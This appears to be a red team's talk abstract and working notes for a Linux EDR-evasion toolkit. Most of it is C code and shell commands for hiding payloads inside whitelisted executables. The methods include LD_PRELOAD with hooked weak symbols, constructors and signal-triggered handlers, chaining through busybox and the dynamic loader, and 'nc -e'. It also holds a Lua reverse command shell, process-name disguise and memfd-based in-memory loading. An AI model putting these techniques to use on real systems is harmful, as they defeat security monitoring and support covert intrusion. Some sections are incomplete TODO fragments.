Behavioral Manipulation of Whitelisted Executables in Linux for EDR Evasion

Scenario:


Endpoint Detection and Response solutions have landed in Linux. With the ever increasing footprint of Linux machines deployed in data centers, threat actors have been forced to move cross platform in the presence of new defensive capabilities. EDRs have their challenges in covering Linux landscape, and as such they come in various designs and address defense differently. Some focus on sandboxing, others place more effort on execution heuristics, yet others provide facilities to create restricted shells and exist in support of an enterprise policy, augmenting already existing solutions with whitelisting executables on systems. 

On a recent Red Team engagement our team was faced with overcoming a commercial EDR on Linux. In this talk we wanted to share a few techniques we used to slide under the EDR radar, and expand offensive post-exploitation capabilities on a farm of hardened Linux machines. As they say, when EDRs give you lemons ... you turn them into oranges, and let EDRs make lemonade ;)

Specifically, we will see how pristine (often approved) executables could be subverted to execute foreign functionality avoiding runtime injection or common anti-debugging signatures the defense is looking for. We will walk through the process of using well known capabilities of a dynamic loader, take lessons from user-land root-kits in evasion choices, and attempt to lead DFIR teams on a wild goose chase after the artifacts of a compromise.

Many of the details that went into such evasion could be generalized and possibly reused against other EDRs. We fully believe that the ability to retool in the field matters, so we distilled the techniques into reusable code patterns and a small toolkit which will be used as a basis for our discussion. 

Compelling known good executables to misbehave is so much fun (and profit)!

-----

On a recent engagement  our team  was faced with overcoming a commercial EDR on Linux. We wanted to share a few techniques  

The idea is to: 
- ride approved binaries without modifying them or injecting them at runtime
- start them preloaded but without any details of the internal workings 
- use library preloading in novel ways
- split and scatter offensive functionality to fool heuristics, forensics and gain func via chaining
- widening the shim with non-native functionality for rapid prototyping. 


- Hooking an unknown (or non-specific) API assumes 
 - you know how the target API workings
 - you have ability to target it without detection (exec or external watcher)
 - you have the ability to interoperate claencly, fully, implment filter and to extend hooks
 - you also may need to have inspection tooling to hook *that specific use case*, in adveresarial env while the mom is watching


What is you can be agnostic to the application you are tryint to control
- Inject at the start
- Inject generically 
- Expand features out of band
	- dynamic loading
	- weak ref loading

- DFIR lifting target executable gets non-modified, clean exe

- The dlopen allows you to use libraries that you do not depend on directly (and which may or may not be present). The libraries that you do depend on directly (such as libc.so): 
do not need to be dlopened (the loader will have already mapped them for you before your program starts) and
are not optional (the loader will fail hard if they are missing).


## Cases

### TODO: .init/.fini

```c
static void init(int argc, char **argv, char **envp) {
    puts(__FUNCTION__);
}

static void fini(void) {
    puts(__FUNCTION__);
}
```

### TODO: __libc_start_main()

### Case 1: Weak symbol references: gcc  __attribute__((weak));
Explanation:
`main` does not dlopen(). DFIR can take the main: main is clean, unless execution context is known and LD_PRELOAD is seen


> gcc(1):
 `weak`
 The weak attribute causes the declaration to be emitted as a weak symbol rather than a global. This is primarily useful in defining library functions which can be overridden in user code, though it can also be used with non-function declarations. Weak symbols are supported for ELF targets, and also for a.out targets when using the GNU assembler and linker. 

> nm(1):
 `w` 
  The symbol is a weak symbol that has not been specifically tagged as a weak object symbol.  When a weak defined symbol is linked with a normal defined symbol, the normal defined symbol is used with no error.  When a weak undefined symbol is linked and the symbol is not defined, the value of the symbol is determined in a system-specific manner without error.  On some systems, uppercase indicates that a default value has been specified

Example: 

main() calls weak debug() found in libweakref:debug() 
main:
```c
void debug() __attribute__((weak));
int main(void)
{
    if (debug) { // IF loaded / resolved 
        printf("main: debug()\n");
        debug(); // resolved at runtime
    }
    return 0;
}
```

libweakref.so:
```c
void debug() __attribute__((weak));
// Weak ref check example. Alternative to dlopen()
void debug(){
    printf("libweakref.so: debug()\n");
}
```

Example: 
`$ LD_PRELOAD=lib/libweakref.so bin/main_weakref`

a. Weak symbols can be created in *your* shim/cradle . The idea is: main is a clean executable with exploit delivered in libweakref.so out of band

b. But you can hunt for existing Linux *known good* executables:

```
$ file /bin/ls
/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3f60bd5f1fee479caaed0f4b1dc557a2086d3851, stripped
```

```
$ nm /bin/ls
nm: /bin/ls: no symbols
```
If stripped:

```
$ nm --dynamic  /bin/ls | grep 'w '
w __cxa_finalize
w __gmon_start__
w _ITM_deregisterTMCloneTable
w _ITM_registerTMCloneTable
```

Or  unstripped (e.g. /usr/bib/java):
```
$nm /usr/bin/java | grep 'w '
w __gmon_start__
w _Jv_RegisterClasses
```

Symbols `__gmon_start__` and `__cxa_finalize` seem to be present and weak. We can preload most of ELF executables in our code:


libweakref.so:
```c
// Injection to any ELF
void __gmon_start__(){
     if (gmon_ct < 1 ){
       printf("in __gmon_start__ weak hook\n");
       gmon_ct++;

     }else{
       printf("in __gmon_start__ weak hook but already started\n");
     }
}

// Evasion trampoline (atexit hook)
void __cxa_finalize() {
     if (cxa_ct < 1 ){
         printf("in __cxa_finalize weak hook\n");
         cxa_ct++;

     }else{
         printf("in __cxa_finalize weak hook but already started\n");
     }
}

Exmaple:
```
`LD_PRELOAD=./liblibweakref.so /bin/ls` 
-or-
`LD_LIBRARY_PATH=$LD_LIBRARY_PATH:../lib LD_PRELOAD=libweakref.so /bin/ls`

```sh
$ LD_PRELOAD=lib/libweakref.so /bin/ls
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```
Note: We are escaping double-execution of a hook by checking if `__gmon_start__` is already hooked
Note2: as you can see with weak symbols we are not explictly working with dlopen()/dlsym()) RTLD_*'s. WE only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of it (no crash) and proper appearance in the process table is prioritized.
Note3: `__cxa_finalize` invocation is not always possible.

c. Chained weakrefs
We can evade even deeper by scattering weak references across preloaded libraries, and asemble the payload in memory.
Same technique as in the first scenarion (main) but weak symbols are exported from the downstream library

Explanation: 
main:main() calls libwearkerf.so:debug() calls libweakref2:mstat() 

main:
```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
int main(void)
{
    if (debug) {
        printf("main: debug()\n");
        debug();
    }

    if (mstat) {
        printf("main: test trampoline to stat()\n");
        mstat();
    }
}
```

libweakref.so:
```c
void debug() __attribute__((weak));
void mstat() __attribute__((weak)
void debug(){
    printf("debug()\n");

    if (mstat) {
        printf("debug: mstat()\n");
        mstat();
    }
}
```
libweakref2.so:
```c
void mstat() __attribute__((weak)
void mstat(){
    printf("mstat()\n");
}
```

Example:
`$ LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref`

```sh
$ LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref 
in __gmon_start__ weak hook
in __gmon_start__ weak hook but already started
in __gmon_start__ weak hook but already started
main: debug()
debug()
debug: stat()
mstat()
main: test trampoline to stat()
mstat()
in __cxa_finalize weak hook
in __cxa_finalize weak hook but already started
in __cxa_finalize weak hook but already started
```
- Most ELFs: decoy on Process table
- No dlopen()'s 
 

### Case 2: .ctor/.dtor via gcc __attribute__((constructor (P))) and __attribute__((destructor (P)))
a. Direct constructors and descructors
b. Chained / prioritized constructors and destructors
c. Hijacking arguments. 
Explanation:

```c
void before_main(void) __attribute__((constructor (101)));
void before_main(void)
{

    /* This is run before main() */
    printf("Before main()\n");

}

//delayed invocation
void after_main(void) __attribute__((destructor (101)));
void after_main(void)
{

    /* This is run after main() returns (or exit() is called) */
    printf("After main()\n");

}
```

Example:
```sh
$ LD_PRELOAD="lib/libmctor.so" /bin/ls 
Before main()
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
```

- Override of constructor and destructor priorities
Explanation: TBD.

c. // Constructor called by ld.so before the main. This is not guaranteed but works. ¯\_(ツ)_/¯
`__attribute__((constructor)) static void mctor(int argc, char **argv, char** ennvp)`




### Case 3: Evasion via busybox and ld loader:
Explanation:
`/bin/busybox /bin/ls`
` LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  ls `
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  find /bin -name cat -exec /bin/ls / \; `
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  nc -f /dev/pts/0  -e /bin/ls`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  openvt -c 5  -w /bin/ls > /tmp/ls.out`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so script -c /bin/ls`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so busybox setsid  -c /bin/ls`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so start-stop-daemon -x /bin/ls --start`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so taskset 0x00000001 /bin/ls`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so echo | xargs /bin/ls`
`echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/ls`

Example of advanced evasion:
1. Direct find of executable
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts  --regex '^main_.*$' ./bin/`

2. Double link evasion
`mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls; LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  run-parts   /tmp/shadowrun/`

3. Chaining 
`echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox  xargs /bin/busybox xargs xargs /bin/busybox /bin/ls`
`echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls`
`echo | LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2 /bin/busybox time /bin/ls`

4. Escape via TTY
`vi -ensX $(/lib64/ld-linux-x86-64.so.2 /bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'`
`LD_PRELOAD=./lib/libweakref.so:./lib/libweakref2.so /lib64/ld-linux-x86-64.so.2  vi -ensX $(/bin/busybox mktemp)  -c ':1,$d' -c ':silent !/bin/ls'  -c ':wq'`


### Case 4: Timed execution and fault Branching:
Explanation: non-linear invocation of code for evasion. We break the "story" with interrupts. We can combine that with other methods. Achieves deeper evasion from dormant code branch

1. Direct external signalshandlers e.g. SIGHUP, SIGUSR1/2
TODO: clearly split off from src/intrp.c  to showcase capability

libinterrupt.so:
```c
void before_main(void) __attribute__((constructor));
void before_main(void)
{
    printf("Before main()\n");
    setSigHandler(500000);
}
void setSigHandler(int sleep_interval){

    printf("Setting SIGHUP Signal handler ...\n");
    printf("PPID: %d PID: %d \n", getppid(), getpid());
    signal(SIGHUP, handleSigHup);
    for (;;) {
        if (gotint)
            break;
        usleep(sleep_interval);
    }
    printf("Signal handler got signal ... \n");
    doWork();

}
void handleSigHup(int signal) { gotint = 1; }
void doWork(void){
    printf("Executing payloads here ...\n");
}

```

Example: 
`LD_PRELOAD=lib/libinterrupt.so /bin/ls`
```sh
Before main()
Setting SIGHUP Signal handler ...
PPID: 23305 PID: 126946 

Signal handler got signal ... 
Executing payloads here ...
bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh

`$ kill -HUP 126946`


- External trigger of code branch. Can help with sandbox profiling 

```
2. A variation on the theme: Fault based (SIGFPE) handlers
Expanation: self-triggered fault (e.g. division by 0) and recovery handler. 
Payload in the recovery handler. Keeping the decoy process alive, but evading IoC chain detection

`$ LD_PRELOAD=lib/libinterrupt.so /bin/ls`

```sh
$ LD_PRELOAD=lib/libinterrupt.so bin/main
Before main()
Trigger SIGFPRE handler
In SIGFPE handler
1 / 0: caught division by zero!
Executing payloads here ...
```

## Expanding the capabilities.

### Case 1: Hiding behind reflective giants. Golang to the rescue
### Case 2: Embedding Interpeters

Building a lua-5.3.5 Lua shared library:
- Download Lua sources: `curl -R -O http://www.lua.org/ftp/lua-5.3.5.tar.gz ; tar zxf lua-5.3.5.tar.gz`

- Make Lua with `-fPIC`, this generates object files
`make MYCFLAGS="$CFLAGS -fPIC -DLUA_COMPAT_5_2 -DLUA_COMPAT_5_1" MYLDFLAGS="$LDFLAGS" linux`

- Compile Lua objects into a shared library (skil luac.o due to redefinition of `main`):
`gcc -o liblua.so -shared $(ls -1 *.o  | egrep -v '(luac.o)' | tr '\n' ' ') -fPIC`

```
liblua.so: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=5e6c638e9225395f4d1b47531081c4ffd20d8d57, not stripped```

``
ldd liblua.so 
	linux-vdso.so.1 (0x00007ffe619ba000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ba1021000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f6ba1241000)
```

invoke_lua.c
```c
#include <lua.h>                                /* Always include this when calling Lua */
#include <lauxlib.h>                            /* Always include this when calling Lua */
#include <lualib.h>                             /* Always include this when calling Lua */

#include <stdlib.h>                             /* For function exit() */
#include <stdio.h>                              /* For input/output */

void bail(lua_State *L, char *msg){
	fprintf(stderr, "\nFATAL ERROR:\n  %s: %s\n\n",
		msg, lua_tostring(L, -1));
	exit(1);
}

int main(int argc, char** argv)
{

	if (argc !=2){
		printf("Usage %s </path/to/script.lua>\n", argv[0]);
		return 1;
	}

    lua_State *L;

    L = luaL_newstate();                  /* Create Lua state variable */
    luaL_openlibs(L);                     /* Load Lua libraries */

    if (luaL_loadfile(L, argv[1]))        /* Load but don't run the Lua script */
	bail(L, "luaL_loadfile() failed");    /* Error out if file can't be read */

    printf("In C, calling Lua\n");

    if (lua_pcall(L, 0, 0, 0))            /* Run the loaded Lua script */
	bail(L, "lua_pcall() failed");        /* Error out if Lua file has an error */

    printf("Back in C again\n");

    lua_close(L);                         /* Clean up, free the Lua state var */

    return 0;
}

```

- Use the newly minted `liblua.so` to build a `C` shim:
`gcc -o invoke_lua invoke_lua.c -I/root/Code/zombieant/ext/luadist-static-lua/include/ -L`pwd` -llua -lm -ldl -lreadline`

```
ldd invoke_lua
	linux-vdso.so.1 (0x00007ffd0036a000)
	liblua.so => not found
	libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc0c0cb1000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fc0c0cac000)
	libreadline.so.7 => /lib/x86_64-linux-gnu/libreadline.so.7 (0x00007fc0c0a5f000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc0c08a2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fc0c0e71000)
	libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fc0c0874000)

```

- Invoke lua script via `C` shim preloading `liblua.so` as dependency:
`LD_LIBRARY_PATH=. LD_PRELOAD=./liblua.so ./invoke_lua hello.lua`


####  Bringing Lua libraries
- Manual:
wget https://luarocks.org/manifests/gunnar_z/lsocket-1.4.1-1.rockspec
wget $(grep url lsocket-1.4.1-1.rockspec  | cut -d= -f2 | sed 's/"//g')

- with luarocks:

`luarocks instal luasocket`

Find luarocks install location and copy to your deployment dir where lbraries will live:
`rsync -rvz /usr/local/lib/lua/5.3/* slibs/`



```lua
print(package.path..'\n'..package.cpath)

-- via cpath
package.cpath = './slibs/?.so;'
print("Cpath:"..package.cpath)
local socket = require('socket')
local tcp = assert(socket.tcp());

local server = assert(socket.bind("127.0.0.1", 8081))
-- find out which port the OS chose for us
local ip, port = server:getsockname()
print("Server on " .. ip .. ":"..port)

-- via path
local rhost = "127.0.0.1"
local rport = "1337"
assert(tcp:connect(rhost,rport));
  while true do
    local r,x=tcp:receive()
    local fin=assert(io.popen(r,"r"))
    local data=assert(fin:read("*a"));
    tcp:send(data);
  end;
fin:close()
tcp:close()
-- local path = "./slib/lsocket.so"
--local f = assert(loadlib(path, "luaopen_socket"))
-- f()

```


### In memory SQLite3
Q:
```
What reads and writes small blobs (for example, shared libraries) 35% faster than the same blobs can be read from or written to individual files on disk using fread() or fwrite().
```
A: SQLite3

Memory mode. 

swqlite:
gcc -shared -o libsqlite3.so -fPIC sqlite3.o -ldl -lpthr

driver:
```c
#include <stdio.h>      // printf
#include <sqlite3.h>    // SQLite header (from /usr/include)

int main()
{
    sqlite3 *db;        // database connection
    int rc;             // return code
    char *errmsg;       // pointer to an error string

    /*
     * open SQLite database file test.db
     * use ":memory:" to use an in-memory database
     */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        printf("ERROR opening SQLite DB in memory: %s\n", sqlite3_errmsg(db));
        goto out;
    }
    printf("opened SQLite handle successfully.\n");

    /* use the database... */

out:
    /*
     * close SQLite database
     */
    sqlite3_close(db);
    printf("database closed.\n");
}
```
`gcc -O0  driver.c -o driver -L`pwd` -lsqlite3  -I`pwd` -ldl -lpthread`

```
LD_LIBRARY_PATH=. LD_PRELOAD=./libsqlite3.so ./driver 
opened SQLite handle successfully.
database closed.
```

### Mycropython

`cc -std=c99 -I. -I../.. -DNO_QSTR -shared -fPIC    -c -o hello-dyn.o hello-embed.c`
`cc -Wall -o hello-dyn  -L. -lmicropy`

Building with more featured cp ../../ports/unix/mpconfigport.h mpconfigport.h


### Weaponizing preloads
- load via memfd_create: src/pypreload.py

    `python src/pypreload.py /bin/bash `pwd`/bin/main_init`

- psevade daemonization, process renaming
- LD_ args

- in-memory instrumentaton of preloaded libraries


- port of Postgres process name change from py-setproctitle to psevade
// Adopted from https://github.com/dvarrazzo/py-setproctitle/tree/master/src

gcc -c -Wall -Werror -fpic spt_status.c
gcc -shared -o libspt.so spt_status.o
gcc -L. -Wall -o spt_demo spt_demo.c  -lspt

LD_LIBRARY_PATH=$LD_LIBRARY_PATH:.  LD_PRELOAD=libspt.so ./spt_demo
LD_LIBRARY_PATH=$LD_LIBRARY_PATH:.  LD_PRELOAD=libspt.so ./spt_demo

^^ - figure out how to renme in ctor

```
129484 pts/0    S+     0:00                  |   |   |   \_ /bin/bash                                                                        
129485 pts/0    S+     0:00                  |   |   |       \_ /root/Code/zombieant/bin/main 

```
```
 24300 pts/4    Ss     0:02                  |   |   \_ bash 
  1478 pts/4    S+     0:00                  |   |   |   \_ hello, world d  
```

### Protecting your cradles 

So what if someone preloaded your shims. e.g. sandbox
- preinit arrays 
```
__attribute__((section(".preinit_array"), used)) static typeof(preinit) *preinit_p = preinit;
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini
```

```sh
$ LD_PRELOAD=ext/hax.so bin/main_init 
preinit
init
argv[0] = bin/main_init
--- Before main ---
main
Main check: LD_PRELOAD detected through getenv()
fini
```

### Nomain

1. TODO:
nomain.c:

```c
// gcc -nostartfiles -o nomain nomain.c 
/* when called :
        $ LD_PRELOAD="./nomain" /bin/cat 
    ctor invokes, "main" does not 

    when called :
        $ ./nomain 
    ctor invokes, "main" invkes
    
*/
__attribute__((constructor)) static void myctor(int argc, char **argv, char* envp[]){

        printf("in ctor\n");
}
int _(void);
void _start()
{
    int x = _(); //calling custom main function 
    exit(x);
}
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

2. TODO: Hiding in plain Symbol  sight

nomain_entry.c:
```c
int _(void);
void __data_frame_e()
{ 
    int x = _(); //calling custom main function 
    exit(x);
} 
int _() {
    printf("in main: %s\n", __FUNCTION__);
    while (1) ;
    return 0;
}
```

3. TODO:

nomain_interp.c:
```c
// gcc -shared -Wl,-e,fn_no_main nomain.c -o nomain.so
// 32bit const char my_interp[] __attribute__((section(".interp"))) = "/lib/ld-linux.so.2";
// patchelf --set-interpreter /lib64/ld-linux-x86-64.so.2
// const char my_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
const char my_interp[] __attribute__((section(".interp"))) = "/usr/local/bin/gelfload-ld-x86_64";
int fn_no_main() {
    printf("This is a function without main\n");
    exit(0);
}
```
4. TODO: loaders
- malisai
- gelfloader
- ELF-loader in lxbin

## TODO for libctx
- fully clean LD_PRELOAD  in ctor of an injector )libctx)
- weak attributes modules load from libctx
- multilib loading in LD_PRELOAD
- __gmon_start__ (w) https://github.com/lattera/glibc/blob/master/csu/gmon-start.c
	[ref] (https://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol)
- JNI LD_PRELOAD
- execve LD_PRELOAD putenv?
### Good to have:

- attempt 2 stage loading of so in memory
  a. bootstrapper .
    - daemonizes itself, 
    - gets paylaod .so, 
    - stuffs it to memd_created file descriptor, 
    - records fd <-> so mapping in memory table, 
    - opens communication pipe 
    - responds to requests for payload so's. sends file descriptor client needs to preload the payload .so from. idea is that because the boostrapper is the same owner as the requestor, the requestor can read the /proc/pid/fd/memfd for another process. 
  b. client 
    - requests payload fds over pipe, 
    - LD_PRELOAD via /proc/pid/fd 
 - 1 stage ad-hoc streamlining of a) 




- malisal ELF loader work
- https://github.com/daveho/EasySandbox